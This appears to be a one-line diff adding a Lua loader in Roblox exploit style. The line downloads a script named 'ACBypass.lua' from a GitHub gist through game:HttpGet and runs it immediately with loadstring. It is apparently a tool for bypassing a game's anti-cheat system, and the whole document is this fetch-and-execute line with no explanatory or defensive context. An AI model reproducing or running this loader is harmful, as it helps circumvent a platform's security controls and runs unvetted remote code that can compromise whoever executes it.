@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://gist.githubusercontent.com/polybiusproxy/1728e33f6f8c4b2975cbdf25fa7f9b21/raw/2a50f23d31fddb2cebae561b4baa4e85e58e7547/ACBypass.lua'))()
